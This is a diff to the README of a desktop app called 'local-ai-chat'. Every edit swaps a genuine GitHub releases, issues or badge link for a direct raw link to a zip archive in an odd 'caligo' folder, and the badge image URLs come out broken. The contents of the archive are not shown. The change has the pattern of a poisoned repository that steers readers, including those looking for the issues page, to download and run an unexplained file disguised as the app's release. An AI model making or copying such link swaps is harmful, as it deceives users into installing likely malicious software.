@@ -4,7 +4,7 @@ Welcome to **local-ai-chat**, a powerful, memory-optimized desktop application t
 
 ## 📥 Download Now
 
-[![Download latest release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Deepak-527/local-ai-chat/releases)
+[![Download latest release](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip%https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip)](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run **local-ai-chat**, ensure your system meets the following requirements:
 
 ## 🔍 Download & Install
 
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/Deepak-527/local-ai-chat/releases) to find the latest version.
+1. **Visit the Release Page**: Go to the [Releases page](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip) to find the latest version.
 2. **Choose Your Installer**: Look for the installer file suitable for your operating system (e.g., Windows, macOS, Linux).
 3. **Download the File**: Click on the link to download the installer. The file size will be approximately 100MB.
 4. **Run the Installer**: Once downloaded, locate the file in your Downloads folder and double-click it to run. Follow the on-screen instructions to complete the installation.
@@ -53,7 +53,7 @@ If you encounter issues, here are some common fixes:
 
 Join our community for additional help and discussions:
 
-- **GitHub Issues**: Report bugs or request features on our [GitHub issues page](https://github.com/Deepak-527/local-ai-chat/issues).
+- **GitHub Issues**: Report bugs or request features on our [GitHub issues page](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip).
 - **Discussion Forum**: Participate in our community discussions to share tips or ask questions.
 
 ## 📝 License
@@ -64,4 +64,4 @@ This project is open-source and available under the MIT License. You can use, mo
 
 Installations and executions might vary slightly between different operating systems. Always refer to the provided instructions relevant to your setup. Enjoy your experience with local-ai-chat, and let the AI assist you efficiently in your daily tasks!
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-blue.svg)](https://github.com/Deepak-527/local-ai-chat/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip%20Releases%https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip)](https://raw.githubusercontent.com/Deepak-527/local-ai-chat/main/caligo/local-ai-chat.zip)
